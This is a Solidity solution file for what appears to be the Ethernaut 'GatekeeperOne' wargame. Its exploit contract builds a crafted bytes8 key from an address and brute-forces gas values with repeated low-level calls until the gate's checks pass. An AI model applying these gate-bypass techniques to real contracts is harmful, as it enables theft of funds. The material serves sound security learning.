// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./GatekeeperOne.sol";

function playerScript(address instanceAddress) {
    ////////// YOUR CODE GOES HERE //////////
    GatekeeperOneExploit exploit = new GatekeeperOneExploit(instanceAddress);
    exploit.execute();
    ////////// YOUR CODE END //////////
}

////////// YOUR CODE GOES HERE //////////
contract GatekeeperOneExploit {
    GatekeeperOne gatekeeper;

    constructor(address instanceAddress) {
        gatekeeper = GatekeeperOne(instanceAddress);
    }

    function execute() public {
        bytes8 key = bytes8(
            uint64(uint16(uint160(address(msg.sender)))) + 0x8000000000000000
        );
        uint256 currentFee = 8191 * 10;
        uint256 beforeLeft = gasleft();
        powerCall(key, currentFee);
        uint256 afterLeft = gasleft();
        uint256 used = beforeLeft - afterLeft;

        while (true) {
            used--;
            bool ok = powerCall(key, currentFee + used);
            if (ok) break;
        }
    }

    function powerCall(bytes8 key, uint256 gas) private returns (bool success) {
        (success, ) = address(gatekeeper).call{gas: gas}(
            abi.encodeCall(GatekeeperOne.enter, (key))
        );
    }
}
////////// YOUR CODE END //////////
